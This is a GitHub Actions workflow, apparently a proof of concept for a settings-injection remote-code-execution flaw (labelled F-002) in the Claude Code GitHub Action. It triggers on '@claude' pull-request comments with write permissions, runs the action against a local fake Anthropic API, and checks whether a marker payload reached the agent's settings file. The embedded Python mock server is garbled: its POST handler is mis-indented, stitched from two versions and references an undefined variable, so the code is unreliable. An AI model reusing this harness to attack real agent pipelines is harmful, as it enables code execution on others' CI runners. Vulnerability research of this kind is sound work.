name: F-002 Free Read-Only PoC

on:
  issue_comment:
    types: [created]

permissions:
  contents: write
  pull-requests: write
  issues: write
  id-token: write

jobs:
  claude:
    if: |
      github.event.issue.pull_request &&
      contains(github.event.comment.body, '@claude')

    runs-on: ubuntu-latest

    steps:
      # =========================================================
      # 1. Checkout trusted BASE repository
      # =========================================================
      - name: Checkout trusted base repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # =========================================================
      # 2. Show benign config from victim/base
      # =========================================================
      - name: Show trusted base settings
        shell: bash
        run: |
          echo "======================================"
          echo "TRUSTED BASE SETTINGS BEFORE CLAUDE"
          echo "======================================"

          echo "PWD=$(pwd)"
          echo

          echo "Current branch:"
          git branch --show-current || true

          echo
          echo "Trusted settings file:"
          cat config/claude-action-settings.json

      # =========================================================
      # 3. Start local Anthropic-compatible mock
      #    IMPORTANT: return 200, NOT 500
      # =========================================================
      - name: Start local fake Anthropic API
        shell: bash
        run: |
          cat > /tmp/fake_anthropic.py <<'PY'
          from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
          import json
          import time

          HOST = "127.0.0.1"
          PORT = 8787

          class Handler(BaseHTTPRequestHandler):
              def log_message(self, fmt, *args):
                  print("[HTTP] " + (fmt % args), flush=True)

              def read_json(self):
                  length = int(self.headers.get("content-length", "0"))

                  if length <= 0:
                      return {}

                  raw = self.rfile.read(length)

                  try:
                      return json.loads(raw)
                  except Exception:
                      return {}

              def do_GET(self):
                  print(
                      f"[REQUEST] GET {self.path}",
                      flush=True
                  )

                  body = json.dumps({
                      "status": "ok",
                      "service": "f002-synthetic-anthropic"
                  }).encode()

                  self.send_response(200)
                  self.send_header(
                      "Content-Type",
                      "application/json"
                  )
                  self.send_header(
                      "Content-Length",
                      str(len(body))
                  )
                  self.end_headers()

                  self.wfile.write(body)

              def do_POST(self):
    length = int(self.headers.get("content-length", "0"))

    raw = b""
    if length:
        raw = self.rfile.read(length)

    text = raw.decode("utf-8", errors="replace")

    print("FAKE ANTHROPIC REQUEST:", self.path, flush=True)

    marker = "F002_READ_ONLY_RCE"

    if marker in text:
        print("======================================", flush=True)
        print("F002_SESSIONSTART_RCE=CONFIRMED", flush=True)
        print("======================================", flush=True)

        pos = text.find(marker)

        # Print only a limited region around our synthetic marker.
        start = max(0, pos)
        end = min(len(text), pos + 700)

        evidence = text[start:end]

        print("RCE_CONTEXT_BEGIN", flush=True)
        print(evidence, flush=True)
        print("RCE_CONTEXT_END", flush=True)

    else:
        print(
            "F002_SESSIONSTART_RCE=NOT_FOUND_IN_MODEL_REQUEST",
            flush=True
        )

    body = {
        "type": "error",
        "error": {
            "type": "api_error",
            "message": "Synthetic F-002 lab endpoint"
        }
    }

    data = json.dumps(body).encode()

    self.send_response(500)
    self.send_header("Content-Type", "application/json")
    self.send_header("Content-Length", str(len(data)))
    self.end_headers()
    self.wfile.write(data)

                  print(
                      "[REQUEST INFO] " +
                      json.dumps({
                          "model": request_json.get("model"),
                          "stream": request_json.get("stream"),
                          "max_tokens": request_json.get("max_tokens")
                      }),
                      flush=True
                  )

                  # ---------------------------------------------
                  # Token-count endpoint
                  # ---------------------------------------------
                  if "count_tokens" in self.path:
                      body = json.dumps({
                          "input_tokens": 10
                      }).encode()

                      self.send_response(200)
                      self.send_header(
                          "Content-Type",
                          "application/json"
                      )
                      self.send_header(
                          "Content-Length",
                          str(len(body))
                      )
                      self.end_headers()

                      self.wfile.write(body)
                      return

                  # ---------------------------------------------
                  # Only synthetic /v1/messages is supported
                  # ---------------------------------------------
                  if "/v1/messages" not in self.path:
                      body = json.dumps({
                          "type": "error",
                          "error": {
                              "type": "not_found_error",
                              "message": "Synthetic endpoint"
                          }
                      }).encode()

                      self.send_response(404)
                      self.send_header(
                          "Content-Type",
                          "application/json"
                      )
                      self.send_header(
                          "Content-Length",
                          str(len(body))
                      )
                      self.end_headers()

                      self.wfile.write(body)
                      return

                  model = request_json.get(
                      "model",
                      "claude-f002-synthetic"
                  )

                  # ---------------------------------------------
                  # Streaming response
                  # ---------------------------------------------
                  if request_json.get("stream") is True:
                      self.send_response(200)
                      self.send_header(
                          "Content-Type",
                          "text/event-stream"
                      )
                      self.send_header(
                          "Cache-Control",
                          "no-cache"
                      )
                      self.send_header(
                          "Connection",
                          "close"
                      )
                      self.end_headers()

                      events = [
                          (
                              "message_start",
                              {
                                  "type": "message_start",
                                  "message": {
                                      "id": "msg_f002_synthetic",
                                      "type": "message",
                                      "role": "assistant",
                                      "model": model,
                                      "content": [],
                                      "stop_reason": None,
                                      "stop_sequence": None,
                                      "usage": {
                                          "input_tokens": 10,
                                          "output_tokens": 0
                                      }
                                  }
                              }
                          ),
                          (
                              "content_block_start",
                              {
                                  "type": "content_block_start",
                                  "index": 0,
                                  "content_block": {
                                      "type": "text",
                                      "text": ""
                                  }
                              }
                          ),
                          (
                              "content_block_delta",
                              {
                                  "type": "content_block_delta",
                                  "index": 0,
                                  "delta": {
                                      "type": "text_delta",
                                      "text": "Synthetic F-002 response"
                                  }
                              }
                          ),
                          (
                              "content_block_stop",
                              {
                                  "type": "content_block_stop",
                                  "index": 0
                              }
                          ),
                          (
                              "message_delta",
                              {
                                  "type": "message_delta",
                                  "delta": {
                                      "stop_reason": "end_turn",
                                      "stop_sequence": None
                                  },
                                  "usage": {
                                      "output_tokens": 4
                                  }
                              }
                          ),
                          (
                              "message_stop",
                              {
                                  "type": "message_stop"
                              }
                          )
                      ]

                      for event_name, data in events:
                          payload = (
                              f"event: {event_name}\n"
                              f"data: {json.dumps(data)}\n\n"
                          ).encode()

                          self.wfile.write(payload)
                          self.wfile.flush()

                          time.sleep(0.05)

                      return

                  # ---------------------------------------------
                  # Non-streaming fallback
                  # ---------------------------------------------
                  response = {
                      "id": "msg_f002_synthetic",
                      "type": "message",
                      "role": "assistant",
                      "model": model,
                      "content": [
                          {
                              "type": "text",
                              "text": "Synthetic F-002 response"
                          }
                      ],
                      "stop_reason": "end_turn",
                      "stop_sequence": None,
                      "usage": {
                          "input_tokens": 10,
                          "output_tokens": 4
                      }
                  }

                  body = json.dumps(response).encode()

                  self.send_response(200)
                  self.send_header(
                      "Content-Type",
                      "application/json"
                  )
                  self.send_header(
                      "Content-Length",
                      str(len(body))
                  )
                  self.end_headers()

                  self.wfile.write(body)


          print(
              f"Starting synthetic Anthropic server on {HOST}:{PORT}",
              flush=True
          )

          ThreadingHTTPServer(
              (HOST, PORT),
              Handler
          ).serve_forever()
          PY

          nohup python3 /tmp/fake_anthropic.py \
            > /tmp/fake-anthropic.log 2>&1 &

          echo $! > /tmp/fake-anthropic.pid

          sleep 2

          echo "Fake Anthropic API PID:"
          cat /tmp/fake-anthropic.pid

          echo
          echo "Health check:"
          curl -sS http://127.0.0.1:8787/

      # =========================================================
      # 4. Verify localhost mock
      # =========================================================
      - name: Verify local mock
        shell: bash
        run: |
          echo "======================================"
          echo "VERIFY LOCAL MOCK"
          echo "======================================"

          curl -sS \
            -X POST \
            http://127.0.0.1:8787/v1/messages \
            -H 'Content-Type: application/json' \
            --data '{
              "model": "claude-f002-synthetic",
              "max_tokens": 8,
              "messages": [
                {
                  "role": "user",
                  "content": "test"
                }
              ]
            }'

          echo
          echo
          echo "LOCAL_MOCK_OK"

      # =========================================================
      # 5. Run affected action
      # =========================================================
      - name: Run vulnerable Claude Code Action
        id: claude
        continue-on-error: true

        uses: anthropics/claude-code-action@v1

        env:
          ANTHROPIC_BASE_URL: http://127.0.0.1:8787

          # Synthetic trusted workflow value.
          # Not a credential.
          F002_PRIVILEGED_CANARY: "BASE_ONLY_CANARY_F002_7F3B91"

        with:
          anthropic_api_key: "sk-ant-api03-F002-SYNTHETIC-NOT-REAL"

          trigger_phrase: "@claude"

          settings: "config/claude-action-settings.json"

      # =========================================================
      # 6. Inspect what settings are present AFTER action
      # =========================================================
      - name: Inspect F-002 settings provenance
        if: always()
        shell: bash
        run: |
          echo "======================================"
          echo "F-002 SETTINGS PROVENANCE"
          echo "======================================"

          echo
          echo "[1] CURRENT BRANCH"
          echo "--------------------------------------"

          git branch --show-current || true

          echo
          echo "[2] REPOSITORY SETTINGS AFTER ACTION"
          echo "--------------------------------------"

          if [ -f config/claude-action-settings.json ]; then
            cat config/claude-action-settings.json
          else
            echo "MISSING"
          fi

          echo
          echo "[3] CLAUDE USER SETTINGS"
          echo "--------------------------------------"

          if [ -f "$HOME/.claude/settings.json" ]; then
            cat "$HOME/.claude/settings.json"
          else
            echo "MISSING"
          fi

          echo
          echo "[4] F002 PAYLOAD PRESENCE"
          echo "--------------------------------------"

          if grep -q \
            'F002_READ_ONLY_RCE' \
            "$HOME/.claude/settings.json" \
            2>/dev/null; then

            echo "SETTINGS_INJECTION=CONFIRMED"

          else

            echo "SETTINGS_INJECTION=NOT_CONFIRMED"

          fi

      # =========================================================
      # 7. Show requests made to synthetic API
      # =========================================================
      - name: Show fake API requests
        if: always()
        shell: bash
        run: |
          echo "======================================"
          echo "FAKE ANTHROPIC SERVER LOG"
          echo "======================================"

          if [ -f /tmp/fake-anthropic.log ]; then
            cat /tmp/fake-anthropic.log
          else
            echo "No fake API log"
          fi

      # =========================================================
      # 8. Read-only PoC note
      #
      # NO /tmp/f002-proof.txt check.
      # =========================================================
      - name: Show F-002 read-only result
        if: always()
        shell: bash
        run: |
          echo "======================================"
          echo "F-002 READ-ONLY RCE POC"
          echo "======================================"

          echo
          echo "No /tmp/f002-proof.txt is expected."
          echo "This PoC intentionally performs no file writes."
          echo
          echo "Check:"
          echo "1. Inspect F-002 settings provenance"
          echo "2. Run vulnerable Claude Code Action"
          echo
          echo "Search logs for:"
          echo "F002_READ_ONLY_RCE"
